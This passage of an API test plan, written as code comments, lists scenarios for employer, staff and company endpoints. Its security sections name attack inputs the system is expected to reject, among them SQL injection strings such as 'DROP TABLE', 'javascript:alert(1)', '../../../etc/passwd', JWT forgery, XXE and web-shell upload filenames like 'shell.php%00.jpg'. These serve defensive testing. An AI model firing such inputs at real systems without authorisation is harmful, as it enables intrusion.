    /** Scenario 55: Employer registers with valid data */
    /** Step 1 Employer submits required fields with strong password → 201 Created */
    /** Step 2 Employer registers with company-context optional fields → 201 Created */

    /** Scenario 56: Employer registers with duplicate credentials */
    /** Step 1 Employer registers with email already taken by another employer → 409 Conflict */
    /** Step 2 Employer registers with email already taken by a user → 409 Conflict */
    /** Step 3 Employer registers with email already taken by staff → 409 Conflict */
    /** Step 4 Employer registers with username taken by any other entity → 409 Conflict */
    /** Step 5 Employer registers with case-variant of existing email → 409 Conflict */
    /** Step 6 Employer registers with Unicode normalization variant → 409 Conflict */

    /** Scenario 57: Employer registers with invalid inputs */
    /** Step 1 Employer submits empty body → 400 Bad Request */
    /** Step 2 Employer submits username with only special chars "!!!@@@###" → 400 Bad Request */
    /** Step 3 Employer submits 300-char local-part email → 400 Bad Request */
    /** Step 4 Employer submits without password → 400 Bad Request */
    /** Step 5 Employer reuses every bad-email payload from Scenario 4 → 400 Bad Request */
    /** Step 6 Employer reuses every weak-password payload from Scenario 5 → 400 Bad Request */
    /** Step 7 Employer reuses every SQLi/NoSQL/LDAP/XSS payload from Scenarios 11–15 → safely handled */
    /** Step 8 Employer reuses every Unicode/encoding payload from Scenario 17 → safely handled */
    /** Step 9 Employer submits filename-style username "../../../etc/passwd" → 400 Bad Request */
    /** Step 10 Employer submits username "user.exe" → 400 or 201 per policy */
    /** Step 11 Employer submits single-emoji username → 400 if banned, else 201 */
    /** Step 12 Employer submits reserved username (admin/root/system) → 400 or 409 */

    /** Scenario 58: Employer registers with role/privilege escalation */
    /** Step 1 Employer submits "role":"SUPER_ADMIN" → 201, role coerced to EMPLOYER */
    /** Step 2 Employer submits "verified":true → 201, verified=false */
    /** Step 3 Employer submits "approved":true → 201, approved=false */
    /** Step 4 Employer submits "companyVerified":true → 201, ignored */

    // ---- B.2 EMPLOYER LOGIN / LOGOUT ----

    /** Scenario 59: Employer logs in */
    /** Step 1 Employer with valid credentials → 200 OK with employer-scoped token */
    /** Step 2 Employer with wrong password → 401 Unauthorized */
    /** Step 3 Employer using user credentials → 401 Unauthorized */
    /** Step 4 Employer using staff credentials → 401 Unauthorized */
    /** Step 5 Employer with empty credentials → 400 Bad Request */
    /** Step 6 Employer with SQLi/NoSQL bypass attempts → 401 Unauthorized */
    /** Step 7 Employer brute force triggers rate limit → 429 Too Many Requests */

    /** Scenario 60: Employer logs out */
    /** Step 1 Employer logs out with valid token → 200 OK or 204 */
    /** Step 2 Employer logs out twice → 200 then 401 (or both 204 if idempotent) */
    /** Step 3 Employer token after logout used on protected route → 401 if blacklist enabled */

    // ---- B.3 EMPLOYER COMPANY MANAGEMENT ----

    /** Scenario 61: Employer creates company */
    /** Step 1 Employer creates valid company → 201 Created */
    /** Step 2 Employer creates company with same name twice → 409 Conflict */
    /** Step 3 Employer creates multiple distinct companies → 201 each */
    /** Step 4 Employer creates company with empty name → 400 Bad Request */
    /** Step 5 Employer creates company with whitespace-only name → 400 Bad Request */
    /** Step 6 Employer creates company with name containing null byte → 400 Bad Request */
    /** Step 7 Employer creates company with 1-character name → 400 if min length > 1 */
    /** Step 8 Employer creates company with 10000-character name → 400 or 413 */

    /** Scenario 62: Company numeric-field edge cases */
    /** Step 1 Employer creates company with revenue = 0 → 201 Created */
    /** Step 2 Employer creates company with revenue = -1000000 → 400 Bad Request */
    /** Step 3 Employer creates company with revenue = -0.0 → 400 or 201 per policy */
    /** Step 4 Employer creates company with revenue = Long.MAX_VALUE → 400 if exceeds business cap */
    /** Step 5 Employer creates company with revenue = Long.MIN_VALUE → 400 Bad Request */
    /** Step 6 Employer creates company with revenue = Double.MAX_VALUE → 400 (overflow) */
    /** Step 7 Employer creates company with revenue = Double.MIN_VALUE → 400 if below minimum */
    /** Step 8 Employer creates company with revenue = 1.0e308 → 400 (overflow) */
    /** Step 9 Employer creates company with revenue as "1,000,000.00" string → 400 Bad Request */
    /** Step 10 Employer creates company with revenue as "0xDEADBEEF" → 400 Bad Request */
    /** Step 11 Employer creates company with revenue as "007" (octal trap) → 400 or parsed as 7 */
    /** Step 12 Employer creates company with revenue as 0.00000000000000000000001 → 400 or stored as 0 */

    /** Scenario 63: Company phone-number edge cases */
    /** Step 1 Phone "123-ABC-!!!!" → 400 Bad Request */
    /** Step 2 Phone "555" (too short) → 400 Bad Request */
    /** Step 3 Phone "1" → 400 Bad Request */
    /** Step 4 Phone "+++++" → 400 Bad Request */
    /** Step 5 Phone with very long repeated segment → 400 or 413 */
    /** Step 6 Phone with multiple "ext." segments → 400 Bad Request */
    /** Step 7 Phone with emoji only → 400 Bad Request */
    /** Step 8 Phone with XSS payload → 400 or sanitized */
    /** Step 9 Phone with SQL injection → 400 or sanitized */
    /** Step 10 Phone with 30-digit international format → 400 if exceeds E.164 */
    /** Step 11 Phone "0000000000" → 400 Bad Request */
    /** Step 12 Phone "911" → 400 Bad Request */
    /** Step 13 Phone "tel:+1-555-555-5555" URI scheme → 400 Bad Request */
    /** Step 14 Phone "javascript:alert(1)" → 400 Bad Request */

    /** Scenario 64: Company tax-ID edge cases */
    /** Step 1 Tax ID empty → 400 Bad Request */
    /** Step 2 Tax ID "abc" → 400 Bad Request */
    /** Step 3 Tax ID "00-0000000" → 400 if all-zeros invalid */
    /** Step 4 Tax ID too short ("12-345678") → 400 Bad Request */
    /** Step 5 Tax ID too long (15+ digits) → 400 Bad Request */
    /** Step 6 Tax ID with letters ("AB-CDEFGHI") → 400 Bad Request */
    /** Step 7 Tax ID containing HTML/JS → 400 Bad Request */
    /** Step 8 Tax ID containing SQL injection → 400 Bad Request */
    /** Step 9 Tax ID in SSN format ("123-45-6789") → 400 Bad Request */
    /** Step 10 Tax ID "111-11-1111" → 400 Bad Request */

    /** Scenario 65: Company type-field edge cases */
    /** Step 1 Type empty → 400 Bad Request */
    /** Step 2 Type whitespace-only → 400 Bad Request */
    /** Step 3 Type "INVALID_TYPE" not in enum → 400 Bad Request */
    /** Step 4 Type containing script tag → 400 Bad Request */
    /** Step 5 Type with SQL injection → 400 Bad Request */
    /** Step 6 Type as emoji → 400 Bad Request */
    /** Step 7 Type "DROP TABLE companies" → 400 Bad Request */
    /** Step 8 Type "../../etc/passwd" → 400 Bad Request */
    /** Step 9 Type "null" string → 400 Bad Request */
    /** Step 10 Type "undefined" string → 400 Bad Request */

    /** Scenario 66: Company XML/parser bombs in name field */
    /** Step 1 Name containing XXE doctype with file:// entity → 201 with literal stored, no file read */
    /** Step 2 Name containing billion-laughs entity bomb → 201 stored as literal, no expansion */
    /** Step 3 Name containing extremely deep nested XML → 201 or 400 */

    /** Scenario 67: Employer updates / deletes companies */
    /** Step 1 Employer updates own company → 200 OK */
    /** Step 2 Employer deletes own company → 204 No Content */
    /** Step 3 Employer updates non-owned company → 403 Forbidden */
    /** Step 4 Employer deletes non-owned company → 403 Forbidden */
    /** Step 5 Employer updates company that does not exist → 404 Not Found */
    /** Step 6 Employer deletes company that does not exist → 404 Not Found */
    /** Step 7 Employer updates with invalid id format → 400 Bad Request */
    /** Step 8 Employer updates with id of soft-deleted company → 404 Not Found */
    /** Step 9 Employer updates company with mass-assignment payload (ownerId override) → 200, owner unchanged */

    /** Scenario 68: Employer creates company with spoofed creator */
    /** Step 1 Body has "creatorUsername":"admin" while token is employer's own → 201 ignoring body, creator=token user */
    /** Step 2 Body has "creatorUsername":null → 201 with creator=token user */
    /** Step 3 Body has "creatorUsername":"" → 201 with creator=token user */
    /** Step 4 Body has "creatorUsername":"nonexistent_xxx" → 201 with creator=token user */

    /** Scenario 69: Employer concurrent company creation */
    /** Step 1 Two simultaneous creations of same-named company by same employer → exactly one 201, other 409 */
    /** Step 2 Two simultaneous creations by different employers → both 201 (different ownership) */

    // ---- B.4 EMPLOYER STAFF MANAGEMENT ----

    /** Scenario 70: Employer creates staff */
    /** Step 1 Employer creates staff with valid data → 201 Created */
    /** Step 2 Employer creates staff with email already taken by any entity → 409 Conflict */
    /** Step 3 Employer creates staff with username already taken by any entity → 409 Conflict */
    /** Step 4 Employer creates two staff with same email → second 409 Conflict */
    /** Step 5 Employer creates staff for non-owned company → 403 Forbidden */
    /** Step 6 Employer creates staff for non-existent company → 404 Not Found */
    /** Step 7 Employer creates staff with companyId = null → 400 Bad Request */
    /** Step 8 Employer creates staff with companyId = "###INVALID###" → 400 Bad Request */
    /** Step 9 Employer creates staff with companyId of malformed UUID → 400 Bad Request */
    /** Step 10 Employer creates staff with companyId as integer → 400 Bad Request */
    /** Step 11 Employer creates staff with companyId as boolean → 400 Bad Request */
    /** Step 12 Employer creates staff with companyId as JSON array → 400 Bad Request */
    /** Step 13 Employer creates staff with companyId as NoSQL operator object → 400 Bad Request */
    /** Step 14 Employer creates staff with companyId = "00000000-0000-0000-0000-000000000000" → 404 or 400 */
    /** Step 15 Employer creates staff with companyId = "*" wildcard → 400 Bad Request */
    /** Step 16 Employer creates staff with companyId = "%" wildcard → 400 Bad Request */
    /** Step 17 Employer creates staff with SQLi in companyId → 400 Bad Request */
    /** Step 18 Employer creates staff missing username → 400 Bad Request */
    /** Step 19 Employer creates staff with body role/permissions injection → 201, ignored */

    /** Scenario 71: Employer updates / deletes staff */
    /** Step 1 Employer updates own staff → 200 OK */
    /** Step 2 Employer updates staff of another employer → 403 Forbidden */
    /** Step 3 Employer deletes own staff → 204 No Content */
    /** Step 4 Employer deletes staff of another employer → 403 Forbidden */
    /** Step 5 Employer updates non-existent staff id → 404 Not Found */
    /** Step 6 Employer changes staff's companyId to a non-owned company → 403 Forbidden */

    /** Scenario 72: Employer assigns / removes permissions */
    /** Step 1 Employer assigns valid permission set → 200 OK */
    /** Step 2 Employer removes a permission → 200 OK */
    /** Step 3 Employer assigns invalid permission name → 400 Bad Request */
    /** Step 4 Employer assigns permission set containing "*" wildcard → 400 if disallowed */
    /** Step 5 Employer assigns duplicate permissions → 200 OK with deduplication */
    /** Step 6 Employer assigns empty permission array → 200 OK with no permissions */
    /** Step 7 Employer assigns permissions to staff of another employer → 403 Forbidden */
    /** Step 8 Employer assigns permissions to non-existent staff → 404 Not Found */
    /** Step 9 Employer assigns more than allowed number of permissions → 400 Bad Request */

    // ---- B.5 EMPLOYER BUSINESS RULES ----

    /** Scenario 73: Employer reviews are forbidden */
    /** Step 1 Employer attempts to review a user → 403 Forbidden */
    /** Step 2 Employer attempts to review a staff member → 403 Forbidden */
    /** Step 3 Employer attempts to review a company → 403 Forbidden */
    /** Step 4 Employer attempts to review another employer → 403 Forbidden */

    /** Scenario 74: Employer cross-tenant attempts */
    /** Step 1 Employer A reads Employer B's company list → 403 Forbidden */
    /** Step 2 Employer A reads Employer B's staff list → 403 Forbidden */
    /** Step 3 Employer A reads Employer B's audit log → 403 Forbidden */

    // ========================================================================
    //  SECTION C — STAFF ENTITY
    // ========================================================================

    // ---- C.1 STAFF AUTHENTICATION ----

    /** Scenario 75: Staff logs in */
    /** Step 1 Staff with valid credentials → 200 OK with staff-scoped token */
    /** Step 2 Staff with wrong password → 401 Unauthorized */
    /** Step 3 Staff using employer credentials → 401 Unauthorized */
    /** Step 4 Staff using user credentials → 401 Unauthorized */
    /** Step 5 Staff with empty credentials → 400 Bad Request */
    /** Step 6 Staff with SQLi/NoSQL bypass attempts → 401 Unauthorized */
    /** Step 7 Staff with all token-attack vectors from Scenarios 41–46 → 401 Unauthorized */

    /** Scenario 76: Staff logs out */
    /** Step 1 Staff logs out with valid token → 200 OK or 204 */
    /** Step 2 Staff logs out twice → 200 then 401 */
    /** Step 3 Staff token after logout used on protected route → 401 if blacklist enabled */

    // ---- C.2 STAFF PERMISSION-BASED ACCESS ----

    /** Scenario 77: Staff product permissions */
    /** Step 1 Staff with CREATE_PRODUCT adds product → 201 Created */
    /** Step 2 Staff without CREATE_PRODUCT adds product → 403 Forbidden */
    /** Step 3 Staff with UPDATE_PRODUCT updates product → 200 OK */
    /** Step 4 Staff without UPDATE_PRODUCT updates product → 403 Forbidden */
    /** Step 5 Staff with DELETE_PRODUCT deletes product → 204 No Content */
    /** Step 6 Staff without DELETE_PRODUCT deletes product → 403 Forbidden */
    /** Step 7 Staff with READ_PRODUCT reads product → 200 OK */
    /** Step 8 Staff without READ_PRODUCT reads product → 403 Forbidden if read-restricted */

    /** Scenario 78: Staff company access via permission */
    /** Step 1 Staff with UPDATE_COMPANY updates own employer's company → 200 OK */
    /** Step 2 Staff without UPDATE_COMPANY updates company → 403 Forbidden */
    /** Step 3 Staff with DELETE_COMPANY deletes company → 403 Forbidden if reserved to employer */
    /** Step 4 Staff without DELETE_COMPANY deletes company → 403 Forbidden */
    /** Step 5 Staff with permission updates company of another employer → 403 Forbidden */

    /** Scenario 79: Staff acts on resources outside their company */
    /** Step 1 Staff updates product belonging to another employer's company → 403 Forbidden */
    /** Step 2 Staff reads order list of another company → 403 Forbidden */
    /** Step 3 Staff reads staff roster of another company → 403 Forbidden */

    // ---- C.3 STAFF RESTRICTIONS ----

    /** Scenario 80: Staff cannot perform employer-only actions */
    /** Step 1 Staff creates a company → 403 Forbidden */
    /** Step 2 Staff creates new staff account → 403 Forbidden */
    /** Step 3 Staff assigns permissions to themselves → 403 Forbidden */
    /** Step 4 Staff assigns permissions to another staff → 403 Forbidden */
    /** Step 5 Staff registers via the staff-registration endpoint → 403 Forbidden */
    /** Step 6 Staff deletes themselves via employer endpoint → 403 Forbidden */
    /** Step 7 Staff modifies their own permissions → 403 Forbidden */

    /** Scenario 81: Staff role/permission escalation attempts */
    /** Step 1 Staff submits update body with role="EMPLOYER" → 200, role unchanged */
    /** Step 2 Staff submits update body with permissions=["*"] → 200, permissions unchanged */
    /** Step 3 Staff submits update body with companyId override → 200, companyId unchanged */
    /** Step 4 Staff modifies JWT payload to add permission claims → 401 Unauthorized */

    /** Scenario 82: Staff profile management */
    /** Step 1 Staff updates own first/last name → 200 OK */
    /** Step 2 Staff updates own password (current verified) → 200 OK */
    /** Step 3 Staff updates own password without verifying current → 400 or 403 */
    /** Step 4 Staff updates another staff account → 403 Forbidden */
    /** Step 5 Staff updates own email to one already taken → 409 Conflict */
    /** Step 6 Staff updates own username to a reserved name → 400 Bad Request */
    /** Step 7 Staff updates own profile with mass-assignment role/permissions → 200, ignored */

    /** Scenario 83: Staff cannot review entities */
    /** Step 1 Staff attempts to review a product → 403 Forbidden */
    /** Step 2 Staff attempts to review a company → 403 Forbidden */
    /** Step 3 Staff attempts to review a user → 403 Forbidden */
    /** Step 4 Staff attempts to review another staff → 403 Forbidden */
    /** Step 5 Staff attempts to review their employer → 403 Forbidden */

    // ========================================================================
    //  SECTION D — GLOBAL SECURITY & VULNERABILITY TESTS
    // ========================================================================

    /** Scenario 84: Token security across all endpoints */
    /** Step 1 ALL: missing token on protected route → 401 Unauthorized */
    /** Step 2 ALL: malformed token → 401 Unauthorized */
    /** Step 3 ALL: expired token → 401 Unauthorized */
    /** Step 4 ALL: future-dated token (nbf) → 401 Unauthorized */
    /** Step 5 ALL: token with invalid signature → 401 Unauthorized */
    /** Step 6 ALL: alg=none JWT → 401 Unauthorized */
    /** Step 7 ALL: weak HMAC secret JWT → 401 Unauthorized */
    /** Step 8 ALL: kid path-traversal JWT → 401 Unauthorized */
    /** Step 9 ALL: jku/x5u SSRF JWT → 401 Unauthorized */
    /** Step 10 ALL: missing "Bearer" prefix → 401 Unauthorized */
    /** Step 11 ALL: token reuse after logout (blacklist) → 401 Unauthorized */
    /** Step 12 ALL: token reuse after password change → 401 Unauthorized */
    /** Step 13 ALL: token bound to IP, replayed from new IP → 401 if binding enforced */
    /** Step 14 ALL: token in query string instead of header → 400 or 401 (header-only policy) */

    /** Scenario 85: Input validation across all endpoints */
    /** Step 1 ALL: empty email/password on login → 400 Bad Request */
    /** Step 2 ALL: SQL injection in any free-text input → 400 or sanitized 2xx */
    /** Step 3 ALL: XSS payload in any free-text input → 2xx with output encoded */
    /** Step 4 ALL: overly long input fields → 413 Payload Too Large or 400 */
    /** Step 5 ALL: NoSQL operator object in any input → 400 Bad Request */
    /** Step 6 ALL: LDAP injection in any input → 400 or sanitized */
    /** Step 7 ALL: command injection in any input → 2xx with no shell exec */
    /** Step 8 ALL: path traversal in any input → 2xx with no file read */
    /** Step 9 ALL: SSTI/EL/JNDI payloads in any input → 2xx with no template eval */
    /** Step 10 ALL: CRLF injection in any input → 400 or sanitized */
    /** Step 11 ALL: Unicode bidi/homograph in any input → 2xx with normalization */
    /** Step 12 ALL: null-byte truncation attempts in any input → 400 or 2xx with no truncation */

    /** Scenario 86: Authorization & access control */
    /** Step 1 USER → access other user's data via id (IDOR) → 403 Forbidden */
    /** Step 2 STAFF → access executive-only data → 403 Forbidden */
    /** Step 3 EXECUTIVE → access other executive's resources → 403 Forbidden */
    /** Step 4 STAFF → access other company's staff → 403 Forbidden */
    /** Step 5 USER → access staff dashboard → 403 Forbidden */
    /** Step 6 USER → access employer dashboard → 403 Forbidden */
    /** Step 7 ANY → access via verb tampering (PATCH→PUT) → enforced same authz */
    /** Step 8 ANY → access via path traversal in path param → 404 or 400 */
    /** Step 9 ANY → access with role param injected via query string → 2xx, ignored */

    /** Scenario 87: Rate limiting & abuse */
    /** Step 1 Login brute force with 100 attempts → 429 after threshold */
    /** Step 2 Registration spam from one IP → 429 after threshold */
    /** Step 3 API spam (100 req/sec) on read endpoint → 429 after threshold */
    /** Step 4 Concurrent connections from single IP exceed cap → 429 */
    /** Step 5 Per-user rate limit independent from per-IP rate limit */
    /** Step 6 After 429, valid request during cooldown → still 429 */
    /** Step 7 After cooldown elapses, valid request → 200 OK */

    /** Scenario 88: Data integrity */
    /** Step 1 DELETE entity that does not exist → 404 Not Found */
    /** Step 2 UPDATE entity with invalid id format → 400 Bad Request */
    /** Step 3 GET entity with id of soft-deleted entity → 404 Not Found */
    /** Step 4 LIST endpoint excludes soft-deleted rows by default */
    /** Step 5 Sensitive fields (password hash, internal ids) never appear in API responses */
    /** Step 6 Foreign-key violations return 400 or 409 with clean message (no SQL leakage) */

    /** Scenario 89: Error message hygiene */
    /** Step 1 Stack trace never appears in 5xx response body */
    /** Step 2 SQL error never appears in any response body */
    /** Step 3 Internal class names never appear in any response body */
    /** Step 4 File paths never appear in any response body */
    /** Step 5 Login errors do not distinguish "user not found" from "wrong password" */

    // ========================================================================
    //  SECTION E — ADVANCED & HIGH-VALUE TESTS
    // ========================================================================

    /** Scenario 90: Concurrency / race conditions */
    /** Step 1 Two simultaneous registrations with same email → exactly one 201, other 409 */
    /** Step 2 Two simultaneous registrations with same username → exactly one 201, other 409 */
    /** Step 3 Two simultaneous company creations with same name → exactly one 201, other 409 */
    /** Step 4 Two simultaneous staff creations with same email → exactly one 201, other 409 */
    /** Step 5 Two simultaneous reviews of same entity by same user → exactly one 201, other 409 */
    /** Step 6 50 simultaneous redemptions of one-time coupon → exactly one success */
    /** Step 7 20 parallel withdrawals of full balance → only one succeeds (no double-spend) */
    /** Step 8 Cart updates from N parallel sessions → final state consistent */
    /** Step 9 Permission grant then immediate action in second session → second action sees grant */

    /** Scenario 91: Soft delete vs hard delete */
    /** Step 1 Deleted user not returned in list endpoints → confirmed */
    /** Step 2 Deleted user cannot log in → 401 Unauthorized */
    /** Step 3 Deleted user's reviews/orders behavior matches policy (anonymized vs hidden) */
    /** Step 4 Deleted company hides associated products by default */
    /** Step 5 Deleted staff loses all permissions immediately */
    /** Step 6 Restoring soft-deleted entity (if supported) → 200 OK */

    /** Scenario 92: Audit logs */
    /** Step 1 Login event recorded with timestamp + ip → log entry exists */
    /** Step 2 Failed login event recorded → log entry exists */
    /** Step 3 Password change event recorded → log entry exists */
    /** Step 4 Permission grant/revoke recorded → log entry exists */
    /** Step 5 Entity delete recorded with actor + target → log entry exists */
    /** Step 6 Audit log entries are tamper-evident or append-only */
    /** Step 7 Audit log injection attempts (CRLF in username) escaped in log entry */

    /** Scenario 93: JSON parser stress */
    /** Step 1 Deeply nested object (5000 levels) → 400 Bad Request, no stack overflow */
    /** Step 2 Deeply nested array (5000 levels) → 400 Bad Request, no stack overflow */
    /** Step 3 100,000-element flat array in body → 400 or 413 */
    /** Step 4 50,000 distinct keys in body → 400 or 413 */
    /** Step 5 5MB single string value → 413 Payload Too Large */
    /** Step 6 Body with 10,000 duplicate keys → 400 or last-wins consistent behavior */
    /** Step 7 Body with embedded NUL byte in JSON string → 400 or 2xx with no truncation downstream */
    /** Step 8 Body with very large precision number → 400 or coerced safely */

    /** Scenario 94: Date / time handling */
    /** Step 1 Date "2025-13-45" → 400 Bad Request */
    /** Step 2 Date "2025-02-30" → 400 Bad Request */
    /** Step 3 Date "0000-00-00" → 400 Bad Request */
    /** Step 4 Date "9999-12-31" → 400 if outside business range */
    /** Step 5 Date "1969-12-31T23:59:59Z" (pre-epoch) → 400 if signed-time bug */
    /** Step 6 Date Y2038 boundary → 200 OK with no rollover */
    /** Step 7 Date with year 10000 → 400 Bad Request */
    /** Step 8 Date "2025-02-29" (non-leap) → 400 Bad Request */
    /** Step 9 Date "2024-02-29" (valid leap) → 200 OK */
    /** Step 10 Date with hour 24 → 400 Bad Request */
    /** Step 11 Date with minute 60 → 400 Bad Request */
    /** Step 12 Date with leap second → 200 OK or 400 per policy */
    /** Step 13 Date in DST gap (US 02:30 on spring-forward) → resolved consistently */
    /** Step 14 Date in DST overlap (US 01:30 on fall-back) → resolved with explicit offset */
    /** Step 15 Date "tomorrow" / "next tuesday" string → 400 Bad Request */
    /** Step 16 Date with XSS payload → 400 Bad Request */
    /** Step 17 Date numeric epoch 0 → 200 if allowed, else 400 */
    /** Step 18 Date numeric epoch -1 → 400 Bad Request */
    /** Step 19 Date numeric Long.MAX_VALUE → 400 Bad Request */
    /** Step 20 Date null → 400 if required */

    /** Scenario 95: File upload metadata */
    /** Step 1 Upload "../../../etc/passwd" filename → 400, no path traversal on disk */
    /** Step 2 Upload "shell.php" filename → 400 if extension banlist */
    /** Step 3 Upload "shell.php.jpg" double-extension → 400 or stored without exec rights */
    /** Step 4 Upload "shell.jpg.php" double-extension → 400 Bad Request */
    /** Step 5 Upload "shell.pHp" mixed case → 400 Bad Request */
    /** Step 6 Upload "shell.php\u0000.jpg" null-byte extension bypass → 400 Bad Request */
    /** Step 7 Upload "shell.php%00.jpg" → 400 Bad Request */
    /** Step 8 Upload ".htaccess" → 400 Bad Request */
    /** Step 9 Upload "web.config" → 400 Bad Request */
    /** Step 10 Upload Windows reserved name (CON/PRN/NUL/COM1/LPT1) → 400 Bad Request */
    /** Step 11 Upload empty filename → 400 Bad Request */
    /** Step 12 Upload 300-character filename → 400 or stored truncated */
    /** Step 13 Upload filename with spaces → 200 OK with safe stored name */
    /** Step 14 Upload filename with non-ASCII characters → 200 OK with safe stored name */
    /** Step 15 Upload filename containing emoji → 200 OK with safe stored name */
    /** Step 16 Upload filename with HTML/script chars → 400 or sanitized */
    /** Step 17 Upload filename "file.jpg;.php" → 400 Bad Request */
    /** Step 18 Upload filename with embedded path separators → 400 Bad Request */
    /** Step 19 Upload with declared MIME "image/jpeg" but PHP body → 400, content sniffed */
    /** Step 20 Upload with MIME containing CRLF header injection → 400 Bad Request */
    /** Step 21 Upload with size 0 → 400 if min size required */
    /** Step 22 Upload with size = -1 → 400 Bad Request */
    /** Step 23 Upload with size = Long.MAX_VALUE → 400 or 413 */
    /** Step 24 Upload with size > configured cap (e.g., 5GB) → 413 Payload Too Large */
    /** Step 25 Upload polyglot file (GIF89a header + PHP tail) → 400 or stored as inert */
    /** Step 26 Upload SVG with embedded script tag → stored sanitized or content type changed */

    /** Scenario 96: HTTP-level abuse */
    /** Step 1 HTTP method tampering: PUT on POST-only endpoint → 405 Method Not Allowed */
    /** Step 2 HTTP method override header (X-HTTP-Method-Override) → ignored or rejected */
    /** Step 3 Content-Type "application/xml" on JSON endpoint → 415 Unsupported Media Type */
    /** Step 4 Content-Type missing on POST → 400 or 415 */
    /** Step 5 Charset gymnastics in Content-Type → 400 or normalized */
    /** Step 6 Chunked transfer-encoding smuggling → request rejected or unified */
    /** Step 7 Duplicate Content-Length header → 400 Bad Request */
    /** Step 8 Host header injection → 400 or response Host-independent */
    /** Step 9 X-Forwarded-For spoof → ignored unless from trusted proxy */
    /** Step 10 Origin/Referer mismatch on state-changing request → 403 Forbidden if CSRF defended */
    /** Step 11 CORS preflight with arbitrary Origin → 403 unless allowlisted */
    /** Step 12 Compression bomb body (gzip-decoded huge) → 413 Payload Too Large */

    /** Scenario 97: Search / query parameter abuse */
    /** Step 1 Query param with SQL injection → 400 or sanitized */
    /** Step 2 Query param with NoSQL operator (Mongo) → 400 or sanitized */
    /** Step 3 Query param with regex anchor causing ReDoS → response < 200ms */
    /** Step 4 Sort param "name; DROP TABLE x" → 400 or whitelist-rejected */
    /** Step 5 Sort param using non-whitelisted column → 400 Bad Request */
    /** Step 6 Page size > max allowed → 400 or capped */
    /** Step 7 Page size = -1 → 400 Bad Request */
    /** Step 8 Page index = Integer.MAX_VALUE → 200 with empty results, no overflow */
    /** Step 9 Filter param exposing internal field (e.g., password_hash) → 400 or filter ignored */

    /** Scenario 98: Password reset / forgot password (if exposed) */
    /** Step 1 Reset request for existing email → 200 OK with same response as unknown email */
    /** Step 2 Reset request for unknown email → 200 OK with same shape (no enumeration) */
    /** Step 3 Reset token used twice → second use 401 Unauthorized */
    /** Step 4 Reset token tampered → 401 Unauthorized */
    /** Step 5 Reset token expired → 401 Unauthorized */
    /** Step 6 Reset link host parameter (host header poisoning) → email uses canonical host */
    /** Step 7 Reset request rate-limited per email → 429 after threshold */

    /** Scenario 99: Email-verification flow (if exposed) */
    /** Step 1 Verification token used → 200 OK */
    /** Step 2 Verification token reused → 401 or 410 */
    /** Step 3 Verification token tampered → 401 Unauthorized */
    /** Step 4 Verification token expired → 410 Gone */
    /** Step 5 Verifying for already-verified user → 200 idempotent */

    /** Scenario 100: Privacy & PII exposure */
    /** Step 1 Listing endpoint never returns password hashes */
    /** Step 2 Listing endpoint never returns reset tokens */
    /** Step 3 GET own profile returns email; GET other user's profile does not (or 403) */
    /** Step 4 Search endpoint cannot enumerate users by partial email/username */
    /** Step 5 Error responses do not leak whether an email is registered */
    /** Step 6 Server logs do not contain plaintext passwords */
    /** Step 7 Server logs do not contain full Authorization header values */

    /** Scenario 101: Session / cookie hardening (if cookie auth is used) */
    /** Step 1 Session cookie has Secure flag */
    /** Step 2 Session cookie has HttpOnly flag */
    /** Step 3 Session cookie has SameSite=Lax or Strict */
    /** Step 4 Session id rotates on login */
    /** Step 5 Session id rotates on privilege change */
    /** Step 6 Logout invalidates session id server-side */
    /** Step 7 Concurrent sessions per user policy enforced (if defined) */

    // ========================================================================
    //  SECTION F — END-TO-END WORKFLOWS
    // ========================================================================

    /** Scenario 102: Full user lifecycle */
    /** Step 1 Register user → 201 Created */
    /** Step 2 Verify email (if applicable) → 200 OK */
    /** Step 3 Login → 200 OK with token */
    /** Step 4 Browse products → 200 OK */
    /** Step 5 Add to cart → 201 Created */
    /** Step 6 Update cart quantity → 200 OK */
    /** Step 7 Checkout / place order (if endpoint exists) → 201 Created */
    /** Step 8 Review purchased product → 201 Created */
    /** Step 9 Update review → 200 OK */
    /** Step 10 Delete review → 204 No Content */
    /** Step 11 Update profile → 200 OK */
    /** Step 12 Change password → 200 OK */
    /** Step 13 Login with old password → 401 Unauthorized */
    /** Step 14 Login with new password → 200 OK */
    /** Step 15 Logout → 200 OK */
    /** Step 16 Use logged-out token → 401 Unauthorized */
    /** Step 17 Self-delete account (if exposed) → 204 No Content */
    /** Step 18 Login after self-delete → 401 Unauthorized */

    /** Scenario 103: Full employer lifecycle */
    /** Step 1 Register employer → 201 Created */
    /** Step 2 Login → 200 OK with employer token */
    /** Step 3 Create company → 201 Created */
    /** Step 4 Create staff → 201 Created */
    /** Step 5 Assign permissions to staff → 200 OK */
    /** Step 6 Update company → 200 OK */
    /** Step 7 Remove a permission → 200 OK */
    /** Step 8 Delete staff → 204 No Content */
    /** Step 9 Delete company → 204 No Content */
    /** Step 10 Logout → 200 OK */

    /** Scenario 104: Full staff lifecycle */
    /** Step 1 Staff (created by employer) logs in → 200 OK with staff token */
    /** Step 2 Staff with permission creates product → 201 Created */
    /** Step 3 Staff updates product → 200 OK */
    /** Step 4 Staff deletes product → 204 No Content */
    /** Step 5 Staff updates own profile → 200 OK */
    /** Step 6 Staff loses CREATE_PRODUCT permission, then attempts create → 403 Forbidden */
    /** Step 7 Staff is deleted by employer → token revoked, next call 401 */

    /** Scenario 105: Cross-entity workflow consistency */
    /** Step 1 Email registered by user cannot be reused by employer or staff */
    /** Step 2 Email registered by employer cannot be reused by user or staff */
    /** Step 3 Email registered by staff cannot be reused by user or employer */
    /** Step 4 Username uniqueness enforced across all entity types */
    /** Step 5 After deletion of user, the email becomes available (or remains reserved) per policy, consistently */

    // ========================================================================
    //  SECTION G — REGRESSION-CRITICAL EDGE CASES
    // ========================================================================

    /** Scenario 106: Idempotency */
    /** Step 1 DELETE same id twice → first 204, second 404 (not 500) */
    /** Step 2 PUT same body twice → both 200 with same final state */
    /** Step 3 POST with Idempotency-Key header twice → only one resource created (if header supported) */

    /** Scenario 107: Pagination boundaries */
    /** Step 1 page=0 → 200 OK with first page */
    /** Step 2 page=-1 → 400 Bad Request */
    /** Step 3 page=very-large → 200 with empty results */
    /** Step 4 size=0 → 400 Bad Request */
    /** Step 5 size=1 → 200 with one element */
    /** Step 6 size beyond max → 400 or capped */
    /** Step 7 sort by allowed column asc → 200 sorted */
    /** Step 8 sort by allowed column desc → 200 sorted */
    /** Step 9 sort by disallowed column → 400 Bad Request */

    /** Scenario 108: Internationalization */
    /** Step 1 Accept-Language header changes error message language → 200/4xx with localized text */
    /** Step 2 Unsupported locale falls back to default → 200/4xx with default text */
    /** Step 3 Right-to-left language renders without breaking format */

